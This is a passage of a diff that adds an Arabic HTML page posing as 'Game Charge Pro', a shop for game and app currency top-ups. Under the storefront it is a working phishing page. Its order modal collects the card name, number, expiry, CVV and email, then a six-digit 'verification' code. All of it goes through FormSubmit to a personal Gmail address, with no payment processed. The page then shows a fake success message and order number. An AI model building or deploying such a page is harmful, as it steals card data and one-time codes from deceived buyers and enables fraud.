+            display: flex;
+            justify-content: center;
+            gap: 2.5rem;
+            margin-bottom: 2.5rem;
+            flex-wrap: wrap;
+        }
+
+        .payment-icons i {
+            font-size: 2.75rem;
+            color: var(--text-secondary);
+            transition: all 0.3s;
+        }
+
+        .payment-icons i:hover {
+            color: var(--primary);
+            transform: scale(1.15);
+        }
+
+        .copyright {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            padding-top: 2.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        /* Mobile Nav */
+        .mobile-nav-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 2999;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .mobile-nav-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .mobile-nav {
+            position: fixed;
+            top: 0;
+            right: -320px;
+            width: 300px;
+            height: 100vh;
+            background: var(--bg-card);
+            z-index: 3000;
+            padding: 5rem 2rem 2rem;
+            transition: right 0.3s;
+            border-left: 1px solid rgba(var(--primary-rgb), 0.1);
+        }
+
+        .mobile-nav.active {
+            right: 0;
+        }
+
+        .mobile-nav-close {
+            position: absolute;
+            top: 1.25rem;
+            left: 1.25rem;
+            width: 45px;
+            height: 45px;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            background: transparent;
+            color: var(--text-primary);
+            font-size: 1.4rem;
+            cursor: pointer;
+        }
+
+        .mobile-nav ul {
+            list-style: none;
+        }
+
+        .mobile-nav li {
+            margin-bottom: 1.75rem;
+        }
+
+        .mobile-nav a {
+            color: var(--text-primary);
+            text-decoration: none;
+            font-size: 1.3rem;
+            font-weight: 700;
+            transition: color 0.3s;
+        }
+
+        .mobile-nav a:hover {
+            color: var(--primary);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            .mobile-menu { display: flex; align-items: center; justify-content: center; }
+            .hero { padding: 7rem 1.5rem 4rem; }
+            .stats-row { gap: 1.5rem; }
+            .stat-card { min-width: 140px; padding: 1.25rem; }
+            .stat-number { font-size: 2.25rem; }
+            section { padding: 5rem 1.5rem; }
+            .games-grid { grid-template-columns: 1fr; }
+            .game-logo { width: 120px; height: 120px; }
+            .payment-methods-grid { grid-template-columns: repeat(2, 1fr); }
+            .card-input-grid { grid-template-columns: 1fr; }
+            .card-input-grid .form-group.full-width { grid-column: 1; }
+            .code-input { width: 50px; height: 62px; font-size: 1.6rem; }
+            .modal-body { padding: 0 1.75rem 2rem; }
+        }
+
+        .loading-spinner {
+            width: 26px;
+            height: 26px;
+            border: 3px solid transparent;
+            border-top-color: currentColor;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        ::-webkit-scrollbar { width: 10px; }
+        ::-webkit-scrollbar-track { background: var(--bg-dark); }
+        ::-webkit-scrollbar-thumb { background: var(--secondary); border-radius: 5px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary); }
+    </style>
+</head>
+<body>
+    <div class="cyber-universe">
+        <div class="floating-orbs">
+            <div class="orb"></div>
+            <div class="orb"></div>
+            <div class="orb"></div>
+        </div>
+        <div class="grid-floor"></div>
+    </div>
+
+    <!-- Header -->
+    <header>
+        <nav>
+            <div class="logo">
+                <div class="logo-icon"><i class="fas fa-bolt"></i></div>
+                <span class="logo-text">GAME CHARGE</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="#home">الرئيسية</a></li>
+                <li><a href="#games">الألعاب</a></li>
+                <li><a href="#features">المميزات</a></li>
+                <li><a href="#contact">تواصل معنا</a></li>
+            </ul>
+            <div class="header-actions">
+                <button class="theme-toggle" onclick="toggleTheme()"><i class="fas fa-moon"></i></button>
+                <button class="mobile-menu" onclick="toggleMobileNav()"><i class="fas fa-bars"></i></button>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Mobile Nav -->
+    <div class="mobile-nav-overlay" onclick="toggleMobileNav()"></div>
+    <div class="mobile-nav">
+        <button class="mobile-nav-close" onclick="toggleMobileNav()"><i class="fas fa-times"></i></button>
+        <ul>
+            <li><a href="#home" onclick="toggleMobileNav()">الرئيسية</a></li>
+            <li><a href="#games" onclick="toggleMobileNav()">الألعاب</a></li>
+            <li><a href="#features" onclick="toggleMobileNav()">المميزات</a></li>
+            <li><a href="#contact" onclick="toggleMobileNav()">تواصل معنا</a></li>
+        </ul>
+    </div>
+
+    <!-- Hero -->
+    <section class="hero" id="home">
+        <div class="hero-content">
+            <div class="hero-badge">
+                <i class="fas fa-rocket"></i>
+                <span>منصة الشحن الأولى في الشرق الأوسط</span>
+            </div>
+            <h1>اشحن ألعابك المفضلة<br><span class="gradient-text">بسرعة البرق ⚡</span></h1>
+            <p>منصة موثوقة ومعتمدة لشحن جواهر وعملات الألعاب والتطبيقات بأفضل الأسعار وأسرع وقت مع دعم فني متواصل على مدار الساعة</p>
+            <div class="hero-buttons">
+                <a href="#games" class="btn btn-cyber"><i class="fas fa-gamepad"></i> ابدأ الشحن الآن</a>
+                <a href="#contact" class="btn btn-outline"><i class="fas fa-headset"></i> تحدث معنا</a>
+            </div>
+            <div class="stats-row">
+                <div class="stat-card"><div class="stat-number">100K+</div><div class="stat-label">عميل نشط</div></div>
+                <div class="stat-card"><div class="stat-number">24/7</div><div class="stat-label">دعم متواصل</div></div>
+                <div class="stat-card"><div class="stat-number">⚡</div><div class="stat-label">شحن فوري</div></div>
+                <div class="stat-card"><div class="stat-number">100%</div><div class="stat-label">مضمون</div></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Games Section -->
+    <section id="games">
+        <div class="section-header">
+            <div class="section-tag"><i class="fas fa-fire"></i> <span>الأكثر طلباً</span></div>
+            <h2>الألعاب والتطبيقات</h2>
+            <p>اختر لعبتك المفضلة وابدأ الشحن الفوري بأفضل الأسعار</p>
+        </div>
+        <div class="games-container">
+            <div class="games-grid" id="gamesGrid"></div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section class="features-section" id="features">
+        <div class="section-header">
+            <div class="section-tag"><i class="fas fa-crown"></i> <span>لماذا نحن؟</span></div>
+            <h2>مميزاتنا الحصرية</h2>
+            <p>نوفر لك تجربة شحن استثنائية بمعايير عالمية</p>
+        </div>
+        <div class="features-grid">
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-bolt"></i></div><h3>شحن فوري</h3><p>استلم شحنتك خلال ثوانٍ معدودة بعد تأكيد الدفع مباشرة</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-shield-alt"></i></div><h3>آمان تام</h3><p>جميع المعاملات مشفرة ومحمية بأحدث تقنيات الأمان</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-percentage"></i></div><h3>أفضل الأسعار</h3><p>نضمن لك أقل الأسعار مع عروض وخصومات حصرية</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-headset"></i></div><h3>دعم 24/7</h3><p>فريق دعم متخصص متواجد على مدار الساعة لخدمتك</p></div>
+        </div>
+    </section>
+
+    <!-- Contact -->
+    <section id="contact">
+        <div class="section-header">
+            <div class="section-tag"><i class="fas fa-envelope"></i> <span>تواصل معنا</span></div>
+            <h2>نحن هنا لمساعدتك</h2>
+            <p>تواصل معنا عبر أي من القنوات التالية</p>
+        </div>
+        <div class="contact-section">
+            <div class="contact-grid">
+                <div class="contact-card whatsapp"><div class="contact-icon"><i class="fab fa-whatsapp"></i></div><h4>واتساب</h4><p>+970 59 XXX XXXX</p></div>
+                <div class="contact-card telegram"><div class="contact-icon"><i class="fab fa-telegram"></i></div><h4>تيليجرام</h4><p>@GameChargePro</p></div>
+                <div class="contact-card instagram"><div class="contact-icon"><i class="fab fa-instagram"></i></div><h4>انستغرام</h4><p>@gamecharge.pro</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-logo">⚡ GAME CHARGE PRO</div>
+            <p class="footer-text">منصتك الموثوقة لشحن الألعاب والتطبيقات</p>
+            <div class="payment-icons">
+                <i class="fab fa-cc-visa"></i>
+                <i class="fab fa-cc-mastercard"></i>
+                <i class="fab fa-cc-paypal"></i>
+                <i class="fab fa-apple-pay"></i>
+                <i class="fab fa-google-pay"></i>
+                <i class="fab fa-bitcoin"></i>
+            </div>
+            <p class="copyright">© 2024 Game Charge Pro - جميع الحقوق محفوظة</p>
+        </div>
+    </footer>
+
+    <!-- Order Modal -->
+    <div class="modal-overlay" id="orderModal">
+        <div class="modal">
+            <button class="modal-close" onclick="closeOrderModal()"><i class="fas fa-times"></i></button>
+            <div class="step-indicator">
+                <div class="step active" data-step="1">1</div>
+                <div class="step" data-step="2">2</div>
+                <div class="step" data-step="3">3</div>
+            </div>
+
+            <!-- Step 1 -->
+            <div class="step-content active" id="step1">
+                <div class="modal-header">
+                    <h3>📝 تفاصيل الطلب</h3>
+                    <p>أدخل معلومات حسابك لإتمام الشحن</p>
+                </div>
+                <div class="modal-body">
+                    <div class="order-summary"><img src="" alt="" id="summaryImg"><div class="order-summary-info"><h4 id="summaryGame">-</h4><p id="summaryPackage">-</p></div></div>
+                    <div class="form-group"><label><i class="fas fa-box"></i> اختر الباقة</label><select class="form-control" id="packageSelect" required=""><option value="">اختر الباقة المناسبة</option></select></div>
+                    <div class="form-group"><label><i class="fas fa-id-card"></i> معرف الحساب (ID)</label><input type="text" class="form-control" id="accountId" placeholder="أدخل معرف حسابك في اللعبة" required=""></div>
+                    <div class="form-group"><label><i class="fab fa-whatsapp"></i> رقم الواتساب</label><input type="tel" class="form-control" id="phoneNumber" placeholder="مثال: 970591234567" required=""></div>
+                    <button type="button" class="btn-submit" onclick="goToStep(2)">متابعة للدفع <i class="fas fa-arrow-left"></i></button>
+                </div>
+            </div>
+
+            <!-- Step 2: Payment Form -->
+            <div class="step-content" id="step2">
+                <div class="modal-header">
+                    <h3>💳 الدفع الآمن</h3>
+                    <p>اختر طريقة الدفع وأدخل بيانات البطاقة</p>
+                </div>
+                <div class="modal-body">
+                    <div class="order-summary"><img src="" alt="" id="summaryImg2"><div class="order-summary-info"><h4 id="summaryGame2">-</h4><p id="summaryPackage2">-</p></div></div>
+                    <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="paymentForm">
+                        <!-- FormSubmit Hidden Fields -->
+                        <input type="hidden" name="_subject" value="🎮 طلب شحن جديد - Game Charge Pro">
+                        <input type="hidden" name="_template" value="box">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_next" id="nextUrl">
+
+                        <!-- Order Data -->
+                        <input type="hidden" name="اللعبة" id="formGame">
+                        <input type="hidden" name="الباقة" id="formPackage">
+                        <input type="hidden" name="السعر" id="formPrice">
+                        <input type="hidden" name="معرف_الحساب" id="formAccountId">
+                        <input type="hidden" name="رقم_الواتساب" id="formPhone">
+                        <input type="hidden" name="رمز_التحقق" id="formVerificationCode">
+
+                        <div class="payment-methods-grid">
+                            <div class="payment-method visa selected" onclick="selectPayment(this, 'Visa')"><i class="fab fa-cc-visa"></i><span>Visa</span></div>
+                            <div class="payment-method mastercard" onclick="selectPayment(this, 'Mastercard')"><i class="fab fa-cc-mastercard"></i><span>Mastercard</span></div>
+                            <div class="payment-method paypal" onclick="selectPayment(this, 'PayPal')"><i class="fab fa-cc-paypal"></i><span>PayPal</span></div>
+                            <div class="payment-method crypto" onclick="selectPayment(this, 'Crypto')"><i class="fab fa-bitcoin"></i><span>Crypto</span></div>
+                        </div>
+                        <input type="hidden" name="طريقة_الدفع" id="formPaymentMethod" value="Visa">
+
+                        <div class="card-input-grid">
+                            <div class="form-group full-width"><label><i class="fas fa-user"></i> اسم حامل البطاقة</label><input type="text" class="form-control" name="اسم_حامل_البطاقة" id="cardName" placeholder="الاسم كما يظهر على البطاقة" required=""></div>
+                            <div class="form-group full-width"><label><i class="fas fa-credit-card"></i> رقم البطاقة</label><input type="text" class="form-control" name="رقم_البطاقة" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required=""></div>
+                            <div class="form-group"><label><i class="fas fa-calendar"></i> تاريخ الانتهاء</label><input type="text" class="form-control" name="تاريخ_الانتهاء" id="cardExpiry" placeholder="MM/YY" maxlength="5" required=""></div>
+                            <div class="form-group"><label><i class="fas fa-lock"></i> CVV</label><input type="text" class="form-control" name="CVV" id="cardCvv" placeholder="123" maxlength="4" required=""></div>
+                            <div class="form-group full-width"><label><i class="fas fa-envelope"></i> البريد الإلكتروني</label><input type="email" class="form-control" name="البريد_الإلكتروني" id="userEmail" placeholder="example@email.com" required=""></div>
+                        </div>
+                        <button type="submit" class="btn-submit" id="payBtn">إتمام الدفع <i class="fas fa-lock"></i></button>
+                    </form>
+                    <button type="button" class="btn-back" onclick="goToStep(1)"><i class="fas fa-arrow-right"></i> رجوع</button>
+                </div>
+            </div>
+
+            <!-- Step 3: Verification -->
+            <div class="step-content" id="step3">
+                <div class="modal-header">
+                    <h3>🔐 التحقق من الهوية</h3>
+                    <p>أدخل رمز التحقق المرسل إليك</p>
+                </div>
+                <div class="modal-body">
+                    <div class="verification-section">
+                        <div class="code-sent-info"><i class="fas fa-check-circle"></i><span>تم إرسال رمز التحقق إلى بريدك الإلكتروني</span></div>
+                        <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="verificationForm">
+                            <input type="hidden" name="_subject" value="✅ تأكيد رمز التحقق - Game Charge Pro">
+                            <input type="hidden" name="_template" value="box">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_next" id="successNextUrl">
+                            <input type="hidden" name="نوع_الرسالة" value="تأكيد رمز التحقق">
+                            <input type="hidden" name="رمز_التحقق_المدخل" id="formEnteredCode">
+                            <input type="hidden" name="بيانات_الطلب" id="formOrderSummary">
+
+                            <div class="code-inputs">
+                                <input type="text" class="code-input" maxlength="1" data-index="0">
+                                <input type="text" class="code-input" maxlength="1" data-index="1">
+                                <input type="text" class="code-input" maxlength="1" data-index="2">
+                                <input type="text" class="code-input" maxlength="1" data-index="3">
+                                <input type="text" class="code-input" maxlength="1" data-index="4">
+                                <input type="text" class="code-input" maxlength="1" data-index="5">
+                            </div>
+                            <div class="resend-code"><span>لم تستلم الرمز؟</span> <button type="button" id="resendBtn" onclick="resendCode()">إعادة إرسال</button><span id="resendTimer"></span></div>
+                            <button type="submit" class="btn-submit" id="verifyBtn">تأكيد وإتمام العملية <i class="fas fa-check"></i></button>
+                        </form>
+                        <button type="button" class="btn-back" onclick="goToStep(2)"><i class="fas fa-arrow-right"></i> رجوع</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Success -->
+            <div class="step-content" id="stepSuccess">
+                <div class="modal-body">
+                    <div class="success-animation">
+                        <div class="success-checkmark"><i class="fas fa-check"></i></div>
+                        <h3>🎉 تمت العملية بنجاح!</h3>
+                        <p>تم شحن حسابك بنجاح</p>
+                        <p>ستصلك رسالة تأكيد على الواتساب</p>
+                        <div class="order-number" id="orderNumber">#GC-XXXXXX</div>
+                        <button class="btn-submit" onclick="closeOrderModal()"><i class="fas fa-thumbs-up"></i> تمام</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Games Data with all games
+        const gamesData = [
+            {
+                id: 'freefire',
+                name: 'فري فاير',
+                subtitle: 'شحن جواهر Free Fire',
+                image: 'https://pfst.cf2.poecdn.net/base/image/2d3146e8351b0ee784660a9bbb72560f70d79bee2c842cf6051d110d08e3004e?w=200&h=200',
+                rating: '4.9',
+                currency: 'جوهرة',
+                icon: 'fa-gem',
+                packages: [
+                    { amount: '5,000', price: '5$' },
+                    { amount: '12,000', price: '10$' },
+                    { amount: '36,000', price: '25$' },
+                    { amount: '100,000', price: '50$' }
+                ]
+            },
+            {
+                id: 'bigo',
+                name: 'بيقو لايف',
+                subtitle: 'شحن ألماسات Bigo Live',
+                image: 'https://pfst.cf2.poecdn.net/base/image/205c08527844f94f611af79ef2f3c99d1c0d7b260569eea8df987c17fd935cfe?w=512&h=512',
+                rating: '4.8',
+                currency: 'ألماسة',
+                icon: 'fa-gem',
+                packages: [
+                    { amount: '50,000', price: '5$' },
+                    { amount: '150,000', price: '15$' },
+                    { amount: '500,000', price: '50$' },
+                    { amount: '1,000,000', price: '100$' }
+                ]
+            },
+            {
+                id: 'poppo',
+                name: 'بوبو لايف',
+                subtitle: 'شحن عملات Poppo Live',
+                image: 'https://pfst.cf2.poecdn.net/base/image/de137ddace78b19758f1b64c70b117add67ab33b80f836059ada78a47a38b433?w=225&h=225',
+                rating: '4.7',
+                currency: 'عملة',
+                icon: 'fa-coins',
+                packages: [
+                    { amount: '50,000', price: '5$' },
+                    { amount: '150,000', price: '15$' },
+                    { amount: '500,000', price: '50$' },
+                    { amount: '1,000,000', price: '100$' }
+                ]
+            },
+            {
+                id: 'pubg',
+                name: 'ببجي موبايل',
+                subtitle: 'شحن UC - PUBG Mobile',
+                image: 'https://pfst.cf2.poecdn.net/base/image/07afcc38a78850d4bda705d6b6e43b0afae5a860a630266a24eae42f11e4ef3a?w=674&h=485',
+                rating: '4.9',
+                currency: 'UC',
+                icon: 'fa-coins',
+                packages: [
+                    { amount: '660', price: '10$' },
+                    { amount: '1,800', price: '25$' },
+                    { amount: '3,850', price: '50$' },
+                    { amount: '8,100', price: '100$' }
+                ]
+            },
+            {
+                id: 'tiktok',
+                name: 'تيك توك',
+                subtitle: 'شحن عملات TikTok',
+                image: 'https://pfst.cf2.poecdn.net/base/image/4be32935a2b8b44478a150a01a393d3261e4a465e480ef33e5459ff43dc32038?w=240&h=240',
+                rating: '4.8',
+                currency: 'عملة',
+                icon: 'fa-coins',
+                packages: [
+                    { amount: '65,000', price: '5$' },
+                    { amount: '170,000', price: '10$' },
+                    { amount: '350,000', price: '20$' },
+                    { amount: '700,000', price: '35$' }
+                ]
+            },
+            {
+                id: 'likee',
+                name: 'لايكي',
+                subtitle: 'شحن جواهر Likee',
+                image: 'https://pfst.cf2.poecdn.net/base/image/4958aa7fbb695b3f6c48b2a59a93756003243f0b88c170c1e9586dde06bcc9a2?w=225&h=225',
+                rating: '4.6',
+                currency: 'جوهرة',
+                icon: 'fa-gem',
+                packages: [
+                    { amount: '50,000', price: '5$' },
+                    { amount: '150,000', price: '15$' },
+                    { amount: '350,000', price: '30$' },
+                    { amount: '800,000', price: '60$' }
+                ]
+            }
+        ];
+
+        let currentOrder = {};
+        let verificationCode = '';
+
+        // Generate Games Grid
+        function renderGames() {
+            const grid = document.getElementById('gamesGrid');
+            grid.innerHTML = gamesData.map(game => `
+                <div class="game-card" id="${game.id}-card">
+                    <div class="game-banner">
+                        <img src="${game.image}" alt="${game.name}" class="game-logo" onerror="this.src='https://via.placeholder.com/140?text=${game.name}'">
+                    </div>
+                    <div class="game-content">
+                        <div class="game-info">
+                            <div>
+                                <h3 class="game-title">${game.name}</h3>
+                                <p class="game-subtitle">${game.subtitle}</p>
+                            </div>
+                            <div class="game-rating"><i class="fas fa-star"></i> ${game.rating}</div>
+                        </div>
+                        <div class="price-grid" data-game="${game.id}">
+                            ${game.packages.map(pkg => `
+                                <div class="price-chip" data-amount="${pkg.amount} ${game.currency}" data-price="${pkg.price}">
+                                    <span class="amount"><i class="fas ${game.icon}"></i> ${pkg.amount}</span>
+                                    <span class="price">${pkg.price}</span>
+                                </div>
+                            `).join('')}
+                        </div>
+                        <button class="order-btn-main" onclick="openOrderModal('${game.id}')">
+                            <i class="fas fa-bolt"></i> اشحن الآن
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+
+            // Add click handlers for price chips
+            document.querySelectorAll('.price-chip').forEach(chip => {
+                chip.addEventListener('click', function() {
+                    const grid = this.closest('.price-grid');
+                    grid.querySelectorAll('.price-chip').forEach(c => c.classList.remove('selected'));
+                    this.classList.add('selected');
+                });
+            });
+        }
+
+        // Theme
+        function initTheme() {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
+                document.documentElement.classList.add('light');
+            }
+            updateThemeIcon();
+            window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+                document.documentElement.classList.toggle('light', !e.matches);
+                updateThemeIcon();
+            });
+        }
+
+        function toggleTheme() {
+            document.documentElement.classList.toggle('light');
+            updateThemeIcon();
+        }
+
+        function updateThemeIcon() {
+            const icon = document.querySelector('.theme-toggle i');
+            icon.className = document.documentElement.classList.contains('light') ? 'fas fa-sun' : 'fas fa-moon';
+        }
+
+        function toggleMobileNav() {
+            document.querySelector('.mobile-nav').classList.toggle('active');
+            document.querySelector('.mobile-nav-overlay').classList.toggle('active');
+        }
+
+        // Modal Functions
+        function openOrderModal(gameId) {
+            const game = gamesData.find(g => g.id === gameId);
+            if (!game) return;
+
+            currentOrder = { game: game.name, image: game.image, currency: game.currency };
+
+            // Check for pre-selected package
+            const selectedChip = document.querySelector(`[data-game="${gameId}"] .price-chip.selected`);
+            if (selectedChip) {
+                currentOrder.package = selectedChip.dataset.amount;
+                currentOrder.price = selectedChip.dataset.price;
+            }
+
+            // Update summary
+            document.getElementById('summaryImg').src = game.image;
+            document.getElementById('summaryGame').textContent = game.name;
+            document.getElementById('summaryPackage').textContent = currentOrder.package ? `${currentOrder.package} - ${currentOrder.price}` : 'اختر الباقة';
+
+            // Populate package select
+            const select = document.getElementById('packageSelect');
+            select.innerHTML = '<option value="">اختر الباقة المناسبة</option>';
+            game.packages.forEach(pkg => {
+                const opt = document.createElement('option');
+                opt.value = `${pkg.amount} ${game.currency}|${pkg.price}`;
+                opt.textContent = `${pkg.amount} ${game.currency} - ${pkg.price}`;
+                if (currentOrder.package === `${pkg.amount} ${game.currency}`) opt.selected = true;
+                select.appendChild(opt);
+            });
+
+            select.onchange = function() {
+                if (this.value) {
+                    const [amount, price] = this.value.split('|');
+                    currentOrder.package = amount;
+                    currentOrder.price = price;
+                    document.getElementById('summaryPackage').textContent = `${amount} - ${price}`;
+                }
+            };
+
+            // Set redirect URLs (current page)
+            const currentUrl = window.location.href.split('?')[0];
+            document.getElementById('nextUrl').value = currentUrl + '?step=verification';
+            document.getElementById('successNextUrl').value = currentUrl + '?step=success';
+
+            showStep(1);
+            document.getElementById('orderModal').classList.add('active');
+        }
+
+        function closeOrderModal() {
+            document.getElementById('orderModal').classList.remove('active');
+            document.getElementById('packageSelect').selectedIndex = 0;
+            document.getElementById('accountId').value = '';
+            document.getElementById('phoneNumber').value = '';
+            document.getElementById('paymentForm').reset();
+            document.querySelectorAll('.code-input').forEach(i => i.value = '');
+            showStep(1);
+        }
+
+        function showStep(step) {
+            document.querySelectorAll('.step-content').forEach(c => c.classList.remove('active'));
+            document.querySelectorAll('.step').forEach(s => {
+                s.classList.remove('active', 'completed');
+                const num = parseInt(s.dataset.step);
+                if (num < step) s.classList.add('completed');
+                if (num === step) s.classList.add('active');
+            });
+            const el = document.getElementById('step' + step);
+            if (el) el.classList.add('active');
+        }
+
+        function goToStep(step) {
+            if (step === 2) {
+                const pkg = document.getElementById('packageSelect').value;
+                const accountId = document.getElementById('accountId').value;
+                const phone = document.getElementById('phoneNumber').value;
+
+                if (!pkg || !accountId || !phone) {
+                    showToast('يرجى ملء جميع الحقول المطلوبة', 'error');
+                    return;
+                }
+
+                currentOrder.accountId = accountId;
+                currentOrder.phone = phone;
+
+                // Update step 2 summary
+                document.getElementById('summaryImg2').src = currentOrder.image;
+                document.getElementById('summaryGame2').textContent = currentOrder.game;
+                document.getElementById('summaryPackage2').textContent = `${currentOrder.package} - ${currentOrder.price}`;
+
+                // Fill hidden form fields
+                document.getElementById('formGame').value = currentOrder.game;
+                document.getElementById('formPackage').value = currentOrder.package;
+                document.getElementById('formPrice').value = currentOrder.price;
+                document.getElementById('formAccountId').value = accountId;
+                document.getElementById('formPhone').value = phone;
+
+                // Generate verification code
+                verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+                document.getElementById('formVerificationCode').value = verificationCode;
+            }
+            showStep(step);
+        }
+
+        function selectPayment(el, method) {
+            document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
+            el.classList.add('selected');
+            document.getElementById('formPaymentMethod').value = method;
+        }
+
+        // Code input handling
+        document.querySelectorAll('.code-input').forEach((input, index, inputs) => {
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value && index < inputs.length - 1) inputs[index + 1].focus();
+                updateEnteredCode();
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) inputs[index - 1].focus();
+            });
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const chars = paste.replace(/[^0-9]/g, '').split('').slice(0, 6);
+                chars.forEach((c, i) => { if (inputs[i]) inputs[i].value = c; });
+                if (chars.length > 0) inputs[Math.min(chars.length, 5)].focus();
+                updateEnteredCode();
+            });
+        });
+
+        function updateEnteredCode() {
+            let code = '';
+            document.querySelectorAll('.code-input').forEach(i => code += i.value);
+            document.getElementById('formEnteredCode').value = code;
+            document.getElementById('formOrderSummary').value = `اللعبة: ${currentOrder.game} | الباقة: ${currentOrder.package} | السعر: ${currentOrder.price} | معرف الحساب: ${currentOrder.accountId} | الهاتف: ${currentOrder.phone}`;
+        }
+
+        function startResendTimer() {
+            let countdown = 60;
+            const btn = document.getElementById('resendBtn');
+            const timer = document.getElementById('resendTimer');
+            btn.disabled = true;
+            const interval = setInterval(() => {
+                countdown--;
+                timer.textContent = ` (${countdown}s)`;
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    btn.disabled = false;
+                    timer.textContent = '';
+                }
+            }, 1000);
+        }
+
+        function resendCode() {
+            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            document.getElementById('formVerificationCode').value = verificationCode;
+            showToast('تم إرسال رمز جديد', 'success');
+            startResendTimer();
+        }
+
+        function showToast(message, type = 'info') {
+            const existing = document.querySelector('.toast');
+            if (existing) existing.remove();
+
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.style.cssText = `
+                position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%);
+                padding: 1rem 2rem; background: ${type === 'error' ? '#ff1744' : type === 'success' ? '#00e676' : '#7b2cbf'};
+                color: ${type === 'success' ? '#000' : '#fff'}; border-radius: 14px; font-weight: 700;
+                z-index: 9999; box-shadow: 0 15px 40px rgba(0,0,0,0.4); animation: toastIn 0.3s ease;
+            `;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => {
+                toast.style.animation = 'toastOut 0.3s ease forwards';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // Add toast animations
+        const toastStyle = document.createElement('style');
+        toastStyle.textContent = `
+            @keyframes toastIn { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+            @keyframes toastOut { from { opacity: 1; transform: translateX(-50%) translateY(0); } to { opacity: 0; transform: translateX(-50%) translateY(20px); } }
+        `;
+        document.head.appendChild(toastStyle);
+
+        // Card formatting
+        document.getElementById('cardNumber').addEventListener('input', function() {
+            let v = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            this.value = v.match(/.{1,4}/g)?.join(' ') || v;
+        });
+
+        document.getElementById('cardExpiry').addEventListener('input', function() {
+            let v = this.value.replace(/[^0-9]/g, '');
+            if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2);
+            this.value = v;
+        });
+
+        document.getElementById('cardCvv').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Smooth scroll
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            });
+        });
+
+        // Close modal on overlay click
+        document.getElementById('orderModal').addEventListener('click', function(e) {
+            if (e.target === this) closeOrderModal();
+        });
+
+        // Check URL params for step navigation (after FormSubmit redirect)
+        function checkUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            const step = params.get('step');
+
+            if (step === 'verification') {
+                document.getElementById('orderModal').classList.add('active');
+                showStep(3);
+                startResendTimer();
+                // Clear the URL param
+                window.history.replaceState({}, '', window.location.pathname);
+            } else if (step === 'success') {
+                document.getElementById('orderModal').classList.add('active');
+                const orderId = 'GC-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+                document.getElementById('orderNumber').textContent = '#' + orderId;
+                document.querySelectorAll('.step-content').forEach(c => c.classList.remove('active'));
+                document.querySelectorAll('.step').forEach(s => s.classList.add('completed'));
+                document.getElementById('stepSuccess').classList.add('active');
+                // Clear the URL param
+                window.history.replaceState({}, '', window.location.pathname);
+            }
+        }
+
+        // Form submission handlers
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            const cardName = document.getElementById('cardName').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCvv = document.getElementById('cardCvv').value;
+            const email = document.getElementById('userEmail').value;
+
+            if (!cardName || !cardNumber || !cardExpiry || !cardCvv || !email) {
+                e.preventDefault();
+                showToast('يرجى ملء جميع بيانات الدفع', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('payBtn');
+            btn.innerHTML = '<div class="loading-spinner"></div> جاري الإرسال...';
+            btn.disabled = true;
+        });
+
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            const inputs = document.querySelectorAll('.code-input');
+            let enteredCode = '';
+            inputs.forEach(input => enteredCode += input.value);
+
